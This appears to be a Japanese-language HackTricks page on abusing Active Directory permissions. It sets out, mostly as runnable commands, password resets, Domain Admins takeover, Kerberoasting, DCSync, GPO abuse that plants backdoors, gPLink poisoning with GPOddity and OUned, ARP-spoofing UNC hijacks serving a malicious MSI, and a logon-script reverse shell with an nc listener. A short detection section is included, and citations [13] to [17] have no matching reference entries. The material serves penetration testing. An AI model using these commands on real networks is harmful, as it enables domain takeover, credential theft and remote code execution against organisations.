# Active Directory ACLs/ACEs の悪用

{{#include ../../../banners/hacktricks-training.md}}

**このページは主に、** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **および** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges) **の手法をまとめたものです。詳細については、元の記事を確認してください。**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **ユーザーに対する GenericAll 権限**

この権限により、攻撃者は対象ユーザーアカウントを完全に制御できます。`Get-ObjectAcl` コマンドを使用して `GenericAll` 権限を確認したら、攻撃者は次の操作を実行できます。

- **対象ユーザーのパスワードを変更する**: `net user <username> <password> /domain` を使用して、ユーザーのパスワードをリセットできます。
- Linux からは、Samba の `net rpc` を使って SAMR 経由で同じ操作を実行できます。<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **アカウントが無効化されている場合は、UACフラグをクリアする**: `GenericAll` を使うと `userAccountControl` を編集できます。Linuxから、BloodyADで `ACCOUNTDISABLE` フラグを削除できます:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: ユーザーのアカウントにSPNを割り当ててkerberoastableにし、RubeusとtargetedKerberoast.pyを使ってticket-granting ticket（TGT）ハッシュを抽出し、クラックを試みます。

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: ユーザーの事前認証を無効化し、そのアカウントを ASREPRoasting に対して脆弱にする。

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: ユーザーに対する `GenericAll` があれば、証明書ベースの認証情報を追加し、パスワードを変更せずにそのユーザーとして認証できます。以下を参照してください。

{{#ref}}
shadow-credentials.md
{{#endref}}

## **グループに対する GenericAll 権限**

この権限があれば、攻撃者は `Domain Admins` などのグループに対する `GenericAll` 権限を使って、グループメンバーを操作できます。`Get-NetGroup` でグループの識別名を特定した後、攻撃者は次のことができます。

- **自分を Domain Admins グループに追加する**: 直接コマンドを実行するか、Active Directory や PowerSploit などのモジュールを使用して追加できます。

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- LinuxからはBloodyADを利用して、任意のグループに対するGenericAll/Write membership権限を持っている場合、自分をそのグループに追加することもできます。対象グループが「Remote Management Users」にネストされている場合、そのグループを適用するホストで直ちにWinRMアクセスを取得できます:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Write on Computer/User**

コンピューターオブジェクトまたはユーザーアカウントに対してこれらの権限を持っていると、次のことが可能です。

- **Kerberos Resource-based Constrained Delegation**: コンピューターオブジェクトを乗っ取ることができます。
- **Shadow Credentials**: シャドウ認証情報を作成する権限を悪用し、コンピューターまたはユーザーアカウントになりすます手法です。

## **WriteProperty on Group**

特定のグループ（例: `Domain Admins`）のすべてのオブジェクトに対する `WriteProperty` 権限をユーザーが持っている場合、次のことが可能です。

- **Domain Admins グループへの自分の追加**: `net user` コマンドと `Add-NetGroupUser` コマンドを組み合わせて実行でき、ドメイン内での権限昇格が可能です。

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **グループのSelf（Self-Membership）**

この権限により、攻撃者はグループメンバーシップを直接操作するコマンドを使って、`Domain Admins` などの特定のグループに自分自身を追加できます。以下のコマンドを順に実行すると、自分自身を追加できます。

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

同様の権限を利用すると、対象グループに対する `WriteProperty` 権限がある場合、グループのプロパティを変更して自分自身を直接グループに追加できます。この権限の確認と実行には、次のコマンドを使用します。

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

ユーザーに対する `User-Force-Change-Password` の `ExtendedRight` を持っていると、現在のパスワードを知らなくてもパスワードをリセットできます。この権限の確認と悪用は、PowerShellや代替のコマンドラインツールで実行でき、対話型セッションや非対話型環境向けのワンライナーなど、ユーザーのパスワードをリセットする方法が複数あります。コマンドは、シンプルなPowerShellの呼び出しからLinuxでの `rpcclient` の使用まで幅広く、攻撃手段の多様性を示しています。

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **グループに対するWriteOwner**

攻撃者がグループに対する`WriteOwner`権限を持っていることを発見した場合、そのグループの所有者を自分自身に変更できます。対象のグループが`Domain Admins`の場合、所有者を変更することで、グループの属性やメンバーシップをより広範に制御できるため、特に大きな影響があります。この操作では、`Get-ObjectAcl`で正しいオブジェクトを特定し、`Set-DomainObjectOwner`を使って、SIDまたは名前を指定して所有者を変更します。

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **ユーザーに対するGenericWrite**

この権限により、攻撃者はユーザーのプロパティを変更できます。具体的には、`GenericWrite` アクセス権があれば、ユーザーのログオン時に悪意のあるスクリプトを実行するよう、ユーザーのログオンスクリプトパスを変更できます。これは、`Set-ADObject` コマンドを使用して、対象ユーザーの `scriptpath` プロパティを攻撃者のスクリプトを指すように更新することで実現します。

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

ユーザーの [`scriptPath` 属性](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e)にスコープを限定した `WriteProperty` ACE で十分な場合があり、`GenericWrite` は必要ありません。この属性への書き込み権限を、ドメインの `SYSVOL\<domain>\scripts` または `NETLOGON` ツリー内にある書き込み可能なスクリプトと組み合わせ、そのユーザーがログオンしてスクリプトを実行する可能性を評価してください。スクリプトはログオン時に、そのユーザーのコンテキストで実行されます。有効な AD ACL とファイル／共有 ACL はそれぞれ個別に確認してください。一致する Allow ACE や書き込み可能なディレクトリだけでは、必要な経路がすべて整っているとは限りません。

## **グループに対するGenericWrite**

この権限があると、攻撃者はグループメンバーシップを操作できます。たとえば、自分自身や他のユーザーを特定のグループに追加できます。この手順では、credential object を作成し、それを使ってグループへのユーザーの追加または削除を行い、PowerShell コマンドでメンバーシップの変更を確認します。

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Linux からは、グループに対する `GenericWrite` を持っていれば、Samba の `net` でメンバーを追加・削除できます（PowerShell/RSAT が利用できない場合に便利です）：<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

AD オブジェクトの所有権を持ち、そのオブジェクトに対する `WriteDACL` 権限があると、攻撃者は自分自身にそのオブジェクトへの `GenericAll` 権限を付与できます。これは ADSI の操作によって実行され、オブジェクトを完全に制御し、そのグループメンバーシップを変更できるようになります。ただし、Active Directory module の `Set-Acl` / `Get-Acl` cmdlet を使ってこれらの権限を悪用しようとする場合、制限があります。<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### WriteDACL/WriteOwner による迅速な乗っ取り（PowerView）

ユーザーまたはサービスアカウントに対して `WriteOwner` と `WriteDacl` を持っている場合、古いパスワードを知らなくても、PowerView を使って完全な制御を取得し、パスワードをリセットできます:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Notes:
- `WriteOwner` しか持っていない場合は、まず所有者を自分に変更する必要がある場合があります。

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- パスワードリセット後、任意のプロトコル（SMB/LDAP/RDP/WinRM）でアクセスを確認します。

## **ドメインレプリケーション（DCSync）**

DCSync攻撃は、ドメイン上の特定のレプリケーション権限を悪用し、Domain Controllerになりすましてユーザーの認証情報を含むデータを同期します。この強力な手法には、`DS-Replication-Get-Changes`などの権限が必要です。攻撃者はDomain Controllerに直接アクセスせずに、AD環境から機密情報を抽出できます。<sup>[[5]](#references)</sup> [**DCSync攻撃について詳しくはこちら。**](../dcsync.md)

## GPOの委任 <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPOの委任

Group Policy Objects（GPO）の管理を委任すると、重大なセキュリティリスクが生じる可能性があります。たとえば、`offense\spotless`のようなユーザーにGPOの管理権限が委任されている場合、**WriteProperty**、**WriteDacl**、**WriteOwner**などの権限を持つ可能性があります。PowerViewを使って確認できるこれらの権限は、悪用されるおそれがあります。`bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### GPOの権限を列挙する

設定に問題のあるGPOを特定するには、PowerSploitのcmdletを連結して使用できます。これにより、特定のユーザーが管理権限を持つGPOを見つけられます。`powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**特定のポリシーが適用されているコンピューター**: 特定のGPOが適用されるコンピューターを特定し、潜在的な影響範囲を把握できます。`powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**特定のコンピューターに適用されているポリシー**: `Get-DomainGPO`などのコマンドを使うと、特定のコンピューターに適用されているポリシーを確認できます。

**特定のポリシーが適用されているOU**: `Get-DomainOU`を使うと、特定のポリシーの影響を受ける組織単位（OU）を特定できます。

ツール[**GPOHound**](https://github.com/cogiceo/GPOHound)を使って、GPOを列挙し、問題を見つけることもできます。

### GPOの悪用 - New-GPOImmediateTask

設定に問題のあるGPOを悪用して、コードを実行できます。たとえば、即時実行のスケジュールタスクを作成できます。これを利用して、影響を受けるコンピューターのローカルAdministratorsグループにユーザーを追加し、権限を大幅に昇格させることができます。

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy module - GPOの悪用

GroupPolicy moduleがインストールされている場合、新しいGPOの作成とリンク、および影響を受けるコンピューターでbackdoorを実行するためのレジストリ値などの設定が可能です。この方法では、GPOを更新し、実行対象のコンピューターにユーザーがログインする必要があります。

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - GPOの悪用

SharpGPOAbuseは、新しいGPOを作成せずにタスクを追加したり設定を変更したりして、既存のGPOを悪用する方法を提供します。このツールを使うには、変更を適用する前に既存のGPOを変更するか、RSAT toolsを使用して新しいGPOを作成する必要があります。

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### ポリシーの強制更新

GPOは通常、約90分ごとに更新されます。この処理を早めるには、特に変更を実施した後、対象コンピューターで `gpupdate /force` コマンドを実行して、ポリシーを直ちに更新できます。このコマンドを使うと、次回の自動更新サイクルを待たずにGPOへの変更が適用されます。

### 内部の仕組み

`Misconfigured Policy` などのGPOのスケジュールされたタスクを調べると、`evilTask` などのタスクが追加されていることを確認できます。これらのタスクは、システムの動作を変更したり、権限を昇格させたりするスクリプトやコマンドラインツールによって作成されます。

`New-GPOImmediateTask` が生成するXML構成ファイルには、実行するコマンドやトリガーなど、スケジュールされたタスクの詳細が記載されています。このファイルは、GPO内でスケジュールされたタスクがどのように定義・管理されるかを示しており、ポリシー適用の一環として任意のコマンドやスクリプトを実行する方法を提供します。

### ユーザーとグループ

GPOを使うと、対象システムのユーザーやグループのメンバーシップも操作できます。ユーザーとグループのポリシーファイルを直接編集すれば、攻撃者はユーザーをローカルの `administrators` グループなどの特権グループに追加できます。これは、GPO管理権限の委任によってポリシーファイルを変更し、新しいユーザーを追加したり、グループメンバーシップを変更したりできる場合に可能です。

ユーザーとグループのXML構成ファイルには、こうした変更の実装方法が記載されています。このファイルにエントリを追加すると、対象システム全体で特定のユーザーに昇格した権限を付与できます。この方法は、GPOを操作して直接権限昇格を行う手段となります。

ローカルグループのメンバーシップやユーザー権利などのセキュリティ設定については、適用されたGPOテンプレート `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` と `SecEdit` ディレクトリのACLも確認してください。書き込み可能なディレクトリやファイルは調査の手がかりになりますが、変更が有効になるかどうかは、実際のSYSVOL共有アクセス権、拒否ACLと継承ACL、Group Policyコンテナーの権限、ポリシーの適用範囲、クライアントの更新タイミングによって決まります。「GPO Managers」という名前のグループに所属しているだけでは、編集権限があるとは限りません。[Microsoftは、このテンプレートのパスとGroup Policyコンテナー／テンプレートの分離について説明しています。](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

さらに、ログオン／ログオフスクリプトの利用、自動実行用のレジストリキーの変更、.msiファイルによるソフトウェアのインストール、サービス構成の編集など、コード実行や永続化を維持する追加の方法も検討できます。これらの手法を使うと、GPOの悪用を通じてアクセスを維持し、対象システムを制御するさまざまな手段が得られます。

### GPC/GPTの取得先を認証済みの不正サービスにリダイレクトする

GPOは、メタデータを含むLDAP上の **Group Policy Container (GPC)** と、ポリシーファイルを含むSMB上の **Group Policy Template (GPT)** で構成されます。更新時にクライアントはコンテナーの `gPLink` をたどり、参照先のGPCとその `gPCFileSysPath` を読み取り、そのUNCパスからGPTをダウンロードします。そのため、GPC自体、またはOU、Site、Domainの `gPLink` への書き込みアクセスは、特権コンテキストでのポリシー処理につながる可能性があります。<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### GPOddityによる`gPCFileSysPath`のポイズニング

制御下のプリンシパルが対象GPCへの書き込み権限を持つ場合（直接、または**NTLM relay to LDAP**経由）、`gPCFileSysPath` を攻撃者がホストするUNCパスに置き換えます。[GPOddity](https://github.com/synacktiv/GPOddity)はLDAPの変更を自動化し、モジュールベースのポリシーファイル、またはGroup Policyクライアントが `NT AUTHORITY\SYSTEM` として実行するImmediate Taskを含む悪意のあるGPTを提供します。<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

匿名または資格情報を問わないSMB共有では、現在のWindowsクライアントには不十分です。SMB Secure Negotiateでは認証成功の証明が必要なため、不正サービスはドメインIDを検証し、SMBセッションキーを導出して、応答に正しく署名しなければなりません。埋め込みモードでは、制御下のコンピューターアカウントとそのサービスキーを使ってGPOddityを構成し、`[COMMANDS]` セクションでコンピューター側またはユーザー側のペイロードを選択します。<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**ユーザーGPOのエッジケース:** MS16-072適用後も、Windowsは同じTCP接続内に2つのSMB2セッションを作成します。ユーザーセッションが`GPT.INI`を読み取り、その後、コンピューターアカウントのセッションが`ScheduledTasks.xml`などの有効な構成を読み取ります。そのため、不正なサーバーは認証状態、セッションキー、署名キーをソケット単位ではなく、SMB2の`SessionId`単位で管理する必要があります。GPOddity/OUnedに組み込まれたScapyのforkは、`SMBStreamSocketMultiplexing`と多重化対応の`SMBServer`でこれを実装しています。単一セッションのImpacket/Scapyサーバーは、それ以外の場合、誤った署名状態を再利用し、ユーザーポリシーで失敗します。<sup>[[15]](#references)</sup>

#### OUnedによる`gPLink` poisoning

OU、サイト、ドメインに対する`WriteGPLink`、`GenericWrite`または同等の制御権があれば、攻撃者はGPC DNが攻撃者の管理するLDAPホストから提供されるリンクを追加できます。この手法はPetros Koutroumpisが最初に紹介しました。[OUned](https://github.com/synacktiv/OUned)は、LDAPへの書き込みと悪意あるGPC/GPTチェーンを自動化します。<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

被害者はまず不正なLDAPサービスに認証し、`gPCFileSysPath`が不正なSMBサービスを指すGPCを受け取ります。その後、SMBに認証して、提供されたGPTを適用します。したがって、OUnedにはLDAP SPNを持つアカウント、SMB用のHOST SPNを持つマシンアカウント（同じマシンアカウントで両方を満たせます）、およびポート389と445をオペレーターのホストに転送するDNS名前解決またはリバースフォワーディングが必要です。<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

OUnedの組み込みScapy LDAP serverは、実際に制御可能なサービスキーでKerberos/SPNEGOを検証し、JSONから任意のGPCデータを提供します。空のJSONキーはrootDSEを表し、`base64:`プレフィックスはバイナリ値を表します。また、serverはadd/delete/modify/searchに加え、`BASE`、`LEVEL`、`SUBTREE`検索をサポートし、保護なし、整合性保護、機密性保護をネゴシエートできます。これにより、別のWindows componentが攻撃者の制御するLDAP参照をたどる一方で、認証済みLDAPを要求する場合に、このserviceを再利用できます。<sup>[[15]](#references)</sup>

アカウントのパスワードをdummy domainに同期しても、Kerberos keyがすべて再現されるとは限りません。RC4はパスワードから導出されますが、AESのstring-to-keyでは、principalのhostname/domainから導出されるsaltも使用されます。実際のアカウントAES keyを`KerberosSSP`に渡せば、検出可能な変更を加えてマシンアカウント自身が書き込み可能な`msDS-SupportedEncryptionTypes`でRC4を強制する必要がありません。<sup>[[15]](#references)</sup>

#### 検知の手がかり

`gPCFileSysPath`または`gPLink`の変更を、GPO versionの変更や新しいImmediate/Scheduled Task XMLと関連付けて調査します。予期しないnaming contextへのlink、承認済みDC/SYSVOL外のUNC host、マシンアカウント名をリダイレクトするDNS record、通常とは異なるマシンアカウントに対するLDAP/CIFS service ticket、RC4を有効にする`msDS-SupportedEncryptionTypes`の変更を調査します。<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

OU/domainに対する`WriteGPLink`を使うと、GPO自体を編集せずに対象containerの`gPLink`属性を変更し、**既存のGPOを強制的に適用**できます。linkされたGPOがすでに**UNC path**（`\\HOST\share\...`）経由でremote contentを参照している場合、認証済みユーザーは**SYSVOL**を読み取れるため、再利用可能なpolicyをオフラインで探せます。<sup>[[11]](#references)</sup>

大まかな手順:

1. BloodHoundを使って、OUに対する`WriteGPLink`を持つprincipalを特定し、そのOU内のcomputer/userを列挙します。
2. `SYSVOL`を読み取り専用でcloneし、GPOを解析して、UNC pathを参照する**Software Installation**、**drive mappings**（`Drives.xml`）、**logon/startup scripts**を探します。
3. DFS/domain-namespace pathではなく、**直接hostnameを指定するpath**（例: `\\DC02\share\pkg.msi`）を優先します。hostnameベースのpathはL2 spoofingでリダイレクトしやすいためです。
4. 選んだGPO GUIDを対象OUの`gPLink`に追加し、victimがすでに存在するpolicyを処理するようにします。
5. 同じbroadcast domain上で、UNC hostにARP spoofingを行い、そのIPをローカルに割り当てます（`ip addr add <target_ip>/32 dev <iface>`）。これにより、victimのSMB trafficが自分のhostに届きます。
6. attacker SMB server（例: `smbserver.py`）で想定されるpath/filenameを提供し、通常のpolicy処理を待ちます。

`SYSVOL`の収集とGPOの照合例:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

既存のGPOを対象OUにリンクします：

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

リンクされたGPOがUNCパスからMSIを展開する場合、クライアントは**コンピューターの起動時**にそれを取得し、**`NT AUTHORITY\SYSTEM`**としてインストールします。参照先ホストを偽装し、**同じ共有パス／パス／ファイル名**で悪意のあるMSIを配信することで、**SYSVOLを変更せずに**`WriteGPLink`をSYSTEM権限でのコード実行につなげられます。

重要な制約:

- **タイミングが重要です**: 新しいリンクはポリシーの更新時（一般に約90分ごと）に認識されますが、**Software Installation**は通常、**再起動時**に実行されます。
- Windows Installerは通常、パッケージの**`ProductCode`**を使って展開を管理します。製品がすでにインストールされている場合、展開がスキップされることがあります。
- インストーラーによる拒否を避けるには、不正なMSIにパッチを適用し、その**`ProductCode`**と**`PackageCode`**をGPOが想定する正規パッケージのものと一致させます。
- 古い`.aas`広告ファイルが`SYSVOL`に残っていることがあるため、この方法に頼る前に展開がまだ有効に見えることを確認してください。

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### ドライブマップ UNC hijack -> NTLM capture / WebDAV relay

`Drives.xml` の GPP ドライブマッピングでは、ログオン時または再接続時に、ユーザーが設定された UNC パスに対して認証を行います。参照先のホストを spoof すると、**NetNTLMv2** を取得できます。意図的に SMB を失敗させると、Windows は **WebDAV** 経由で再試行し、**HTTP 経由で NTLM** を送信する場合があります。これは **LDAP(S)**、**AD CS**、または **SMB** への relay に、はるかに柔軟に利用できます。

#### ログオン/スタートアップスクリプトの UNC hijack

同じ手法は、`SYSVOL` 内で見つかる UNC 上のスクリプトにも適用できます。

- **ログオンスクリプト**は通常、**ユーザー**コンテキストで実行されます。
- **スタートアップスクリプト**は通常、**コンピューター / SYSTEM** コンテキストで実行されます。

スクリプトのパスが spoof 可能なホスト名を指している場合、UNC ホストをリダイレクトし、想定される場所から置き換え用のスクリプトコンテンツを配信します。

## SYSVOL/NETLOGON ログオンスクリプト Poisoning

`\\<dc>\SYSVOL\<domain>\scripts\` または `\\<dc>\NETLOGON\` 配下の書き込み可能なパスでは、GPO を通じてユーザーのログオン時に実行されるログオンスクリプトを改ざんできます。これにより、ログオンしたユーザーのセキュリティコンテキストで code execution が可能になります。

### ログオンスクリプトを特定する
- 設定済みのログオンスクリプトがあるか、ユーザー属性を確認します。

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- ドメイン内の共有フォルダーをクロールして、スクリプトへのショートカットや参照を洗い出す:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- `.lnk` ファイルを解析して、SYSVOL/NETLOGON 内を指すターゲットを特定する（DFIRに役立つ手法であり、GPOに直接アクセスできない攻撃者にも有用）：

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound は、ユーザーオブジェクトに `scriptPath` ログオンスクリプト属性が設定されている場合、その属性を表示します。GPO で設定されたログオンスクリプトは別のポリシー参照先なので、該当する GPO も確認してください。

### 書き込みアクセスを検証する（共有の一覧表示を鵜呑みにしない）
自動化ツールでは SYSVOL/NETLOGON が読み取り専用と表示されても、対象のスクリプトに異なる NTFS ACL が設定されている場合があります。まず、そのファイルと親ディレクトリを読み取り専用で調査してください。一致する Allow ACE は候補として残ります。実効 SMB および NTFS アクセス、Deny ACE、現在のトークンがすべて影響するためです。

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

承認された書き込みテストは対象を限定し、元に戻せるようにし、元のスクリプトをバックアップして復元できるようにしてください。アクセスをテストするためだけに、正常に動作しているログオンスクリプトを上書きしないでください。書き込みに成功すると、次のユーザーのログオン時に実行される可能性があります。

### RCEのためにVBScriptログオンスクリプトを改変する
業務機能を損なわないよう元のロジックは維持しつつ、PowerShell reverse shellを起動するコマンド（revshells.comで生成）を追記します。

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

ホスト上でリッスンし、次の対話型ログオンを待機します：

```bash
rlwrap -cAr nc -lnvp 443
```

Notes:
- 実行は logging user のトークン（SYSTEM ではない）で行われます。スコープは、そのスクリプトを適用する GPO link（OU、サイト、ドメイン）です。
- 使用後は元の内容とタイムスタンプを復元して後始末します。


## References

- [1] [Active Directory ACL/ACE の悪用](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [特権アカウントとトークン特権](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – ACL 攻撃パスのアップデート](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Active Directory の ACL を使った権限昇格](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Active Directory の権限と特権アカウントをスキャンする](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – Linux からの AD 属性/UAC 操作](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc（グループメンバーシップ）](https://www.samba.org/)
- [10] [HTB Puppy: AD ACL の悪用、KeePassXC Argon2 のクラッキング、DPAPI の復号による DC 管理者権限の取得](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: コード実行と NTLM Relay のための GPO UNC パスの乗っ取り](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: NTLM リレーなどを通じた Active Directory GPO の悪用](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
